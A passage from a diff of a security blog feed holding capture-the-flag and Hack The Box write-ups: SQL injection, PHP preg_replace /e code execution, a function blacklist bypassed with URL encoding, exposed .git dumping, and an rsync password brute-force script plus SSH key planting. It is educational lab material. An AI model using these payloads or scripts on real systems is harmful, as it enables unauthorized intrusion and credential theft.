+&lt;p&gt;So after alot of checking the table and columns my final payload to get flag was &lt;code class=&quot;highlighter-rouge&quot;&gt;' union select value,2,3  from flag -- -&lt;/code&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;LLS{explicit_sqli_is_how_sql_will_die} 2: 3&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;10-dairy-products&quot;&gt;10. Dairy Products&lt;/h3&gt;
+&lt;h4 id=&quot;description-100-2&quot;&gt;Description [100]&lt;/h4&gt;
+&lt;p&gt;There is a new advertising campaign on the classic dairy company’s website. You need to steal their latest product.&lt;/p&gt;
+
+&lt;p&gt;Connect here: http://142.93.3.19:50008&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Solution&lt;/strong&gt;:- As soon as I visited the challenge got the hint as &lt;code class=&quot;highlighter-rouge&quot;&gt;git milk&lt;/code&gt; and checked &lt;code class=&quot;highlighter-rouge&quot;&gt;.git&lt;/code&gt; dir which gave me a git repo. Then I download to my localmachine .&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;root@gr4n173:~# wget -r –no-parent http://142.93.3.19:50008/.git/&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;after that downloaded I used the command as&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~# git log | grep commit | awk '{print $2}' | while read line;do git show $line;done | grep -i &quot;{.*}&quot;
++LLS{you_gitm_gotm_good_partner}
++for i in {1..10}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;git log =&amp;gt;  It gives the commit history.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;grep commit =&amp;gt; It grep the commit only .&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;awk ‘{print $2}’ =&amp;gt; It just takes the commitsha.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;while read line;do git show $line; =&amp;gt; it makes a loop for every shacommit and show all the commit .&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;grep -i “{.*}” =&amp;gt; It grep the flag.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;This way I solved the challenge and got 100 points.&lt;/p&gt;
+
+&lt;h3 id=&quot;11-irregular-expressions&quot;&gt;11. Irregular Expressions&lt;/h3&gt;
+&lt;h4 id=&quot;description-100-3&quot;&gt;Description [100]&lt;/h4&gt;
+&lt;p&gt;Check out our new regular expressions testbed! Now you can test your regex online at!&lt;/p&gt;
+
+&lt;p&gt;Connect here: http://jh2i.com:50018/&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Solution&lt;/strong&gt;:- After visiting the website and viewing the source code I got this.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;b&amp;gt;Warning&amp;lt;/b&amp;gt;:  preg_replace(): Unknown modifier '\' in &amp;lt;b&amp;gt;/var/www/html/index.php&amp;lt;/b&amp;gt; on line &amp;lt;b&amp;gt;39&amp;lt;/b&amp;gt;&amp;lt;br /&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;as &lt;a href=&quot;https://www.php.net/manual/en/function.preg-replace.php&quot;&gt;pre_replace()&lt;/a&gt; there you can find &lt;code class=&quot;highlighter-rouge&quot;&gt;/e&lt;/code&gt;modifier to run the eval() command so I used it&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/public/images/ctf/irregular_virseccon.png&quot; alt=&quot;irregular_express&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;this way I can run the RCE so I used &lt;code class=&quot;highlighter-rouge&quot;&gt;system('ls -al');&lt;/code&gt; to get the files.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;total 16 dr-xr-xr-x 1 www-data www-data 4096 Apr 2 14:33 . drwxr-xr-x 1 root root 4096 Sep 4 2016 .. -r--r--r-- 1 root root 39 Apr 2 14:32 flag_name_dont_guess_plz -rwxr-xr-x 1 root root 2538 Mar 22 00:49 index.php 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;So got the final flag using &lt;code class=&quot;highlighter-rouge&quot;&gt;system('cat flag_name_dont_guess_plz');&lt;/code&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;LLS{php_preg_replace_may_be_dangerous} &lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;12-get-encoded&quot;&gt;12. GET Encoded&lt;/h3&gt;
+&lt;h4 id=&quot;description-125&quot;&gt;Description [125]&lt;/h4&gt;
+&lt;p&gt;I don’t GET this%21 Do you%3F&lt;/p&gt;
+
+&lt;p&gt;Connect here: http://jh2i.com:50013&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Solution&lt;/strong&gt;:- After visiting the challenge,viewing the source code and robots.txt. I got the dir at robots.txt.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/public/images/ctf/robots_virseccon.jpg&quot; alt=&quot;robots.txt&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;then I visited that dir &lt;code class=&quot;highlighter-rouge&quot;&gt;http://jh2i.com:50013/?debug&lt;/code&gt; and got the code below.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;?php
+
+    function debug(){
+        highlight_file(__FILE__);
+
+    }
+    
+
+    // I hate these functions, they are so insecure!
+    $blacklist = &quot;assert|system|passthru|exec|assert|read|open|eval|`|_|file|dir|\.\.|\/\/|curl|ftp|glob&quot;;
+
+
+    // If you supply GET arguments, process them...
+    // Documentation here: http://php.net/manual/en/reserved.variables.get.php
+    if ( count( $_GET ) &amp;gt; 0 ){
+
+        // Check if there are any bad functions in the URL supplied
+        if ( preg_match( &quot;/$blacklist/i&quot;, $_SERVER['REQUEST_URI'] ) ) {
+
+            // If there are all, kindly tell them off. ;)
+            // Documentation here: http://php.net/manual/en/reserved.variables.server.php
+            die( &quot;Go away, hacker! No unsafe functions in \$_SERVER['REQUEST_URI']!!&quot; );
+        
+        }else{
+
+            // Otherwise, execute code as a usual debugging interface.
+            // Pull them out of the GET array as `variable=value` format...
+            list( $function, $argument ) = each($_GET);
+
+            // and call what they supply...
+            // THIS WILL ONLY CALL ONE FUNCTION, SO YOU CAN'T INCLUDE `/?debug`
+            echo(&quot;&amp;lt;pre&amp;gt;&quot;);
+            $function($argument);
+            echo(&quot;&amp;lt;/pre&amp;gt;&quot;);
+        }
+
+    }
+    
+    echo(&quot;&amp;lt;p&amp;gt;Machines hunt for more than humans do.&amp;lt;/p&amp;gt;&quot;);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So I sent a request with url encoding technique you see &lt;a href=&quot;https://www.eso.org/~ndelmott/url_encode.html&quot;&gt;here&lt;/a&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;?passthru=cat flag_that_you_could_never_guess.php&lt;/code&gt;  but not decoded the &lt;code class=&quot;highlighter-rouge&quot;&gt;=&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/public/images/ctf/getencodedflag_virseccon.png&quot; alt=&quot;flag&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This way I solved the challenge.&lt;/p&gt;
+
+&lt;p&gt;This way I was able to solve all challenges from web category except the last one.&lt;/p&gt;
+
+&lt;p&gt;I would like to thank all my reader for being with me. Stay upto date to my blog to see more writeups&lt;/p&gt;
+
+&lt;p&gt;#Stay_Safe&lt;/p&gt;
+
+&lt;p&gt;#COVID-19&lt;/p&gt;</content><author><name>gr4n173&gt;</name></author><category term="virseccon" /><category term="ctf" /><category term="webchallenge" /><category term="SSTI" /><category term="PhpJuggler" /><summary type="html">Web Challenges</summary></entry><entry><title type="html">VirSecCon CTF: Scripting Challenges</title><link href="http://localhost:4000/2020/04/13/virseccon-ctf-scripting.html" rel="alternate" type="text/html" title=" VirSecCon CTF: Scripting Challenges" /><published>2020-04-13T00:00:00+05:45</published><updated>2020-04-13T00:00:00+05:45</updated><id>http://localhost:4000/2020/04/13/virseccon-ctf-scripting</id><content type="html" xml:base="http://localhost:4000/2020/04/13/virseccon-ctf-scripting.html">&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
 
 &lt;p&gt;Scripting is a programming language for a special run-time that automates the execution of tasks; tasks could alternatively be executed one-by-one by a human operator. We people think there is no any difference in between coding and scripting but there is a saying :-&lt;/p&gt;
 
@@ -2097,444 +2477,4 @@ Cannot prepare credentials
 Feedback are really appreciated !!&lt;br /&gt;
 Tweet about this writeup if you like.&lt;/p&gt;
 
-&lt;p&gt;You can see more blog at my medium here: &lt;a href=&quot;https://medium.com/@gr4n173&quot;&gt;gr4n173&lt;/a&gt;.&lt;/p&gt;</content><author><name>gr4n173&gt;</name></author><category term="linux" /><category term="htb" /><category term="ftp" /><category term="sqli" /><category term="RE" /><category term="lkm" /><category term="fuzz" /><category term="whois" /><category term="pcap" /><category term="ffuf" /><summary type="html">HTB:Scavenger</summary></entry><entry><title type="html">Hack The Box: Zetta</title><link href="http://localhost:4000/2020/02/22/htb-zetta.html" rel="alternate" type="text/html" title="Hack The Box: Zetta" /><published>2020-02-22T00:00:00+05:45</published><updated>2020-02-22T00:00:00+05:45</updated><id>http://localhost:4000/2020/02/22/htb-zetta</id><content type="html" xml:base="http://localhost:4000/2020/02/22/htb-zetta.html">&lt;hr /&gt;
-&lt;h1 id=&quot;htbzetta&quot;&gt;HTB:Zetta&lt;/h1&gt;
-
-&lt;p&gt;Zetta box was the hardest box till I have done. It falls under linux and hard category. Especially to read the root flag is a quite tough one. I’ll approach this write-up how I solved it, along with the problems that I had to face during this box. At first I obtained the user flag using ipv6 and rsync service by uploading my authorized_keys then I used postgres along with logger to read root.txt .I’ll show all my payload(including that didn’t work in initial deployment to get the root).&lt;/p&gt;
-
-&lt;h1 id=&quot;box-details&quot;&gt;Box Details&lt;/h1&gt;
-
-&lt;p&gt;&lt;img src=&quot;/public/images/description_box.png&quot; alt=&quot;description_box&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;In above picture it’s ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.156&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;zetta.htb&lt;/code&gt;. Let’s solve this box.&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;h1 id=&quot;recon&quot;&gt;Recon&lt;/h1&gt;
-
-&lt;p&gt;Let’s start with our universal port scanner &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to see the open port and service which shows FTP(TCP 21),SSH(TCP 22) and HTTP(TCP 80).&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-root@gr4n173:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; nmap.txt 10.10.10.156
-Nmap 7.80 scan initiated Sat Jan 25 22:29:29 2020 as: nmap &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; nmap.txt 10.10.10.156
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;zetta.htb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.156&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.29s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Not shown: 997 filtered ports
-PORT   STATE SERVICE VERSION
-21/tcp open  ftp     Pure-FTPd
-22/tcp open  ssh     OpenSSH 7.9p1 Debian 10 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-| ssh-hostkey: 
-|   2048 2d:82:60:c1:8c:8d:39:d2:fc:8b:99:5c:a2:47:f0:b0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|   256 1f:1b:0e:9a:91:b1:10:5f:75:20:9b:a0:8e:fd:e4:c1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|_  256 b5:0c:a1:2c:1c:71:dd:88:a4:28:e0:89:c9:a3:a0:ab &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-80/tcp open  http    nginx
-|_http-title: Ze::a Share
-Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Nmap &lt;span class=&quot;k&quot;&gt;done &lt;/span&gt;at Sat Jan 25 22:30:28 2020 &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;59.55 seconds
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h3 id=&quot;web-enumeration&quot;&gt;Web Enumeration&lt;/h3&gt;
-&lt;p&gt;&lt;strong&gt;&lt;em&gt;zetta.htb&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;After I noticed port 80 &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; opened I visited that site and got this as output.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/public/images/front_page.jpg&quot; alt=&quot;front_page&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Then, I searched every part of this website and found something interesting things in&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;STUFF TO DO&lt;br /&gt;
-Native FTP We support native FTP with FXP enabled. We also support RFC2428.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;and also the credentials username/password for FTP service as below.
-&lt;img src=&quot;/public/images/ftp_details.jpg&quot; alt=&quot;ftp_details&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;ftp&quot;&gt;FTP&lt;/h3&gt;
-
-&lt;p&gt;With this detail I m into the &lt;code class=&quot;highlighter-rouge&quot;&gt;FTP&lt;/code&gt; server now as.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$ ftp zetta.htb
-Connected to zetta.htb.
-220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
-220-You are user number 1 of 500 allowed.
-220-Local time is now 08:23. Server port: 21.
-220-This is a private system - No anonymous login
-220-IPv6 connections are also welcome on this server.
-220 You will be disconnected after 15 minutes of inactivity.
-Name (zetta.htb:bikram): b6xsE32RXmPtAkGvDMpbWK7LCrC3r1SP
-331 User b6xsE32RXmPtAkGvDMpbWK7LCrC3r1SP OK. Password required
-Password:
-230-This server supports FXP transfers
-230-OK. Current restricted directory is 
-230-0 files used (0%) - authorized: 10 files
-230 0 Kbytes used (0%) - authorized: 1024 Kb
-Remote system type is UNIX.
-Using binary mode to transfer files.
-ftp&amp;gt; 
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;here you can see &lt;code class=&quot;highlighter-rouge&quot;&gt;FXP transfers&lt;/code&gt; supports so I used this and got IPV6 from IPV4. If you are familiar with this then you can skip this blog but if you are unknown about this IPV6 and want to know how I got that then you can have a look at this &lt;a href=&quot;https://tools.ietf.org/html/rfc2428&quot;&gt;RFC2428&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;At first I had set tcpdump listner as&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$tcpdump -lni tun0 -vvvvvvvv ip6
-tcpdump: listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Now using this commands:-&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ftp&amp;gt; quote EPRT |1|10.10.10.156|2222|
-200-FXP transfer: from 10.10.16.25 to 10.10.10.156
-200 PORT command successful
-ftp&amp;gt; quote EPRT |2|2001:41d0:52:a00::e66|2222|
-200-FXP transfer: from 10.10.10.156 to 2001:41d0:52:a00::e66%176
-200 PORT command successful
-ftp&amp;gt; quote EPRT |1|10.10.10.156|2222|
-200-FXP transfer: from 2001:41d0:52:a00::e66%176 to 10.10.10.156
-200 PORT command successful
-ftp&amp;gt; quote EPRT |2|dead:beef:2::11df|2222|
-200-FXP transfer: from 10.10.10.156 to dead:beef:2::11df%160
-200 PORT command successful
-ftp&amp;gt; LIST
-?Invalid command
-ftp&amp;gt; quote LIST
-425 Could not open data connection to port 2222: Connection refused
-ftp&amp;gt;
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;from first command&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;quote EPRT |1|10.10.10.156|2222|
-quote EPRT |2|2001:41d0:52:a00::e66|2222|
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;this specifies server should use IPV4 to open a data connection to host of zetta.htb on port 2222 and similar for second command IP6 . Now in third command IPV4 is activated again and IPV6 of my own ip which I got from &lt;code class=&quot;highlighter-rouge&quot;&gt;ifconfig&lt;/code&gt; is used.&lt;/p&gt;
-
-&lt;p&gt;This was I got IPV6 as &lt;em&gt;&lt;strong&gt;dead:beef::250:56ff:febd:a9a4&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$ tcpdump -lni tun0 -vvvvvvvv ip6
-tcpdump: listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
-21:57:25.140243 IP6 (flowlabel 0x924d3, hlim 63, next-header TCP (6) payload length: 40) dead:beef::250:56ff:febd:a9a4.51208 &amp;gt; dead:beef:2::11df.2222: Flags [S], cksum 0x9b6f (correct),
-seq 2652376284, win 28800, options [mss 1337,sackOK,TS val 1847133177 ecr 0,nop,wscale 7], length 0
-21:57:25.140287 IP6 (flowlabel 0x55bf9, hlim 64, next-header TCP (6) payload length: 20) dead:beef:2::11df.2222 &amp;gt; _dead:beef::250:56ff:febd:a9a4_.51208: Flags [R.], cksum 0xe556 (correct),
-seq 0, ack 2652376285, win 0, length 0
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;I pinged to this IPV6 and I got pinged back which indicates it was working fine. Now I tried again with nmap for IPV6 and got this with rsync service at port 8730 as&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$nmap -sV -sC -6 dead:beef::250:56ff:febd:a9a4 -p 1-10000
-Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-16 22:23 +0545
-Nmap scan report for dead:beef::250:56ff:febd:a9a4
-Host is up (0.28s latency).
-Not shown: 9996 closed ports
-PORT     STATE SERVICE VERSION
-21/tcp   open  ftp     Pure-FTPd
-22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)
-| ssh-hostkey: 
-|   2048 2d:82:60:c1:8c:8d:39:d2:fc:8b:99:5c:a2:47:f0:b0 (RSA)
-|   256 1f:1b:0e:9a:91:b1:10:5f:75:20:9b:a0:8e:fd:e4:c1 (ECDSA)
-|_  256 b5:0c:a1:2c:1c:71:dd:88:a4:28:e0:89:c9:a3:a0:ab (ED25519)
-80/tcp   open  http    nginx
-|_http-title: Ze::a Share
-8730/tcp open  rsync   (protocol version 31)
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Host script results:
-| address-info: 
-|   IPv6 EUI-64: 
-|     MAC address: 
-|       address: 00:50:56:bd:a9:a4
-|_      manuf: VMware
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 320.92 seconds
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h3 id=&quot;rsync--authorized_keys--usertxt&quot;&gt;Rsync-&amp;gt; authorized_keys-&amp;gt; User.txt&lt;/h3&gt;
-
-&lt;p&gt;I googled and read everything regarding the service rsync and made some script with nmap as&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$ nmap -sV -6 --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 dead:beef::250:56ff:febd:a9a4
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;but this didn’t work though so I searched other way to get remote rsync to the server and finally this worked for me.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; root@gr4n173:~$rsync -av rsync://[dead:beef::250:56ff:febd:a9a4]:8730/etc/rsyncd.conf  /tmp/rsyncd.conf 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h4 id=&quot;script-in-python&quot;&gt;Script in Python&lt;/h4&gt;
-
-&lt;p&gt;From here I got username &lt;code class=&quot;highlighter-rouge&quot;&gt;roy&lt;/code&gt; now, I had to crack password of user roy. For that, I had wrote an script in python using pexpect to sending and receiving the files over socket. You can download script from &lt;a href=&quot;/exploit/exploit.py&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-`&quot;&gt;#!/bin/python3
-
-import pexpect
-p=open('/usr/share/wordlists/rockyou.txt','r')
-for x in p:
-
-    login = pexpect.spawn('rsync -6 -rdt rsync://roy@[dead:beef::250:56ff:febd:a9a4]:8730/home_roy/.ssh ssh')
-    login.expect('Password:')
-    login.sendline(x)
-    if &quot;auth failed on module&quot; not in login.read():
-       break
-    else:
-       print(x)
-       
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;from here I got the password of user roy as :- computer
-Now I tried to download the id_rsa key of roy user but that fails since roy didn’t have id_rsa key instead used my own authorized_keys to get the shell of user roy.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; root@gr4n173:~$rsync -rdt authorized_keys -6 -rdt rsync://roy@[dead:beef::250:56ff:febd:7d3b]:8730/home_roy/.ssh
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Here now authorized_keys let me to  shell of user roy and also I had used the user roy along with it’s password &lt;code class=&quot;highlighter-rouge&quot;&gt;computer&lt;/code&gt;.&lt;/p&gt;
-
-&lt;h1 id=&quot;shell-as-roy&quot;&gt;Shell as roy&lt;/h1&gt;
-
-&lt;p&gt;Finally I got the shell of roy and got the &lt;code class=&quot;highlighter-rouge&quot;&gt;user.txt&lt;/code&gt; as&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$ ssh roy@zetta.htb
-Linux zetta 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u1 (2019-07-19) x86_64
-Last login: Sat Feb 15 22:05:58 2020 from 10.10.14.193
-roy@zetta:~$ whoami
-roy
-roy@zetta:~$ ls
-user.txt
-roy@zetta:~$ cat user.txt
-a575bdb*************************
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h1 id=&quot;postgresql-exploit&quot;&gt;&lt;strong&gt;Postgresql Exploit&lt;/strong&gt;&lt;/h1&gt;
-
-&lt;p&gt;After I got user.txt i.e. roy shell ,I found .tudu.xml file in home directory of roy where many to do list was written.&lt;/p&gt;
-
-&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.......
-
-					&lt;span class=&quot;nt&quot;&gt;&amp;lt;todo&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;done=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;no&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;collapse=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;no&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;                                                                                            
-                                &lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Check postgresql log for errors after configuration&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;                                                    
-                                &lt;span class=&quot;nt&quot;&gt;&amp;lt;text&amp;gt;&lt;/span&gt;                                                                                                                
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/text&amp;gt;&lt;/span&gt;                                                                                                                                               
-                        &lt;span class=&quot;nt&quot;&gt;&amp;lt;/todo&amp;gt;&lt;/span&gt;                                                                                                                       
-                        &lt;span class=&quot;nt&quot;&gt;&amp;lt;todo&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;done=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;yes&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;collapse=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;no&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-                                &lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Prototype/test DB push of syslog events&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
-                                &lt;span class=&quot;nt&quot;&gt;&amp;lt;text&amp;gt;&lt;/span&gt; 
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/text&amp;gt;&lt;/span&gt;
-                        &lt;span class=&quot;nt&quot;&gt;&amp;lt;/todo&amp;gt;&lt;/span&gt;
-                        &lt;span class=&quot;nt&quot;&gt;&amp;lt;todo&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;done=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;no&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;collapse=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;no&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-                                &lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Testing&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
-                                &lt;span class=&quot;nt&quot;&gt;&amp;lt;text&amp;gt;&lt;/span&gt; 
